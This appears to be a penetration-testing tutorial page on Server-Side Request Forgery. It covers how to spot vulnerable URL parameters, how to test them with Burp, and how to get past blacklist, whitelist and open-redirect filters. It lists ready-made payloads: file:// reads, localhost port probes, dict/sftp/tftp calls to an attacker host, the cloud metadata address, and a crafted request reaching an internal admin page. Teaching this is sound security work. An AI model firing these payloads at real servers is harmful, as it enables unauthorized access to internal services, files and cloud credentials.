# SSRF

**SSRF** stands for **Server-Side Request Forgery**. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.

There are **two types** of SSRF vulnerability; the first is a **regular SSRF** where **data is returned to the attacker's screen**. The second is a **Blind SSRF** vulnerability where an SSRF occurs, but **no information is returned to the attacker's screen**.

## Finding an SSRF

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:

* When a **full URL** is used in a parameter in the address bar:

<figure><img src="../../../../../.gitbook/assets/956e1914b116cbc9e564e3bb3d9ab50a.png" alt=""><figcaption></figcaption></figure>

*   A **hidden field** in a form:\


    <figure><img src="../../../../../.gitbook/assets/237696fc8e405d25d4fc7bbcc67919f0.png" alt=""><figcaption></figcaption></figure>
*   A **partial URL** such as just the hostname:\


    <figure><img src="../../../../../.gitbook/assets/f3c387849e91a4f15a7b59ff7324be75 (1).png" alt=""><figcaption></figcaption></figure>
*   Or **perhaps only the path of the URL**:\


    <figure><img src="../../../../../.gitbook/assets/3fd583950617f7a3713a107fcb4cfa49.png" alt=""><figcaption></figcaption></figure>

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as [https://webhook.site/](https://webhook.site/).



## Testing SSRF

Testers need to find input vectors and fields that could be used for publishing or importing data from a URL (e.g. `GET` and `POST` parameters).

To do this, we have to **navigate through the website** with the **Burp Proxy** activeted, and then we have to analyze the request to **find a possibile vulnerable parameter**.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

With `http://some.website/index.php?url=https://someother.website/index.php`, and `url` being the vulnerable parameter, the following basic payloads can help a tester fetch content of files, scan ports, access filtered resources and so on.

```
file://PATH/TO/FILE
http://127.0.0.1:80/admin
http://127.0.0.1:80
http://127.0.0.1:22
ldap://127.0.0.1:389/%0astats%0aquit
dict://{attacker_url}:11111/
sftp://{attacker_url}:11111/
tftp://{attacker_url}:12346/TESTUDPPACKET
```

To scan for a specific range of private IP addresses (other than `localhost`), Use burp suite intruder that can fetch all of IP addresses in the internal network that is targeted.



## Bypassing Filter

In order to conduct SSRF attacks properly, there may be use cases where filters need to be bypassed

<details>

<summary>Blacklist input filter</summary>

Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can bypass the filter using various techniques :

* Using an alternative IP representation such as :

```
http://127.1/admin
http://0/admin
http:@0/admin
http://0.0.0.0:80/admin
http://[::]:80/admin
http://[0000::1]:80/admin
http://2130706433/admin # Decimal version of localhost
http://0x7f000001/admin # Hexadecimal version of localhost
http://169.254.169.254/admin # amazon cloud
```

* Obfuscating string using URL encoded, even double URL encoded sometimes. Or sometimes the alterantive IP works but the control works with the path /admin. In this case we can encoding only the path (ex `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`)
* Registered your own domain name that resolved the `localhost` IP address.
* Swithing from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

</details>

<details>

<summary>Whilist input filter</summary>

Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, for example the URL must begin with http://expected-host, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.

The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:

*   You can embed credentials in a URL before the hostname, using the `@` character. For example:

    `https://expected-host:fakepassword@evil-host`
*   You can use the `#` character to indicate a URL fragment. For example:

    `https://evil-host#expected-host`
*   You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:

    `https://expected-host.evil-host`
* You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
* You can use combinations of these techniques together.

</details>

<details>

<summary>Open Redirection</summary>

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. \
An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.

For example, the application contains an open redirection vulnerability in which the following URL:

`/product/nextProduct?currentProductId=6&path=http://evil-user.net`

returns a redirection to:

`http://evil-user.net`

You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:

{% code overflow="wrap" %}
```bash
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
{% endcode %}

This SSRF exploit works because the application first validates that the supplied `stockAPI` URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing.

</details>





## Utils ex.

### \&x= to ignore

If we can insert other domain into a parameter but there is the next part of the URL that we have to ignore we can use  `&x=` at the start of ignore part

```bash
# start URL
https://website.thm/item/2?server=api

# the server par replaces the SUBDOMAIN of the URL. 
# We can add in this par all other URL for the request and then tell to request to 
# ignore the next part with &x= symbol
# Requesto to send
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=

# effective request forgery which will be send 
https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2
```







## Resources

{% embed url="https://www.thehacker.recipes/web/inputs/ssrf/" %}
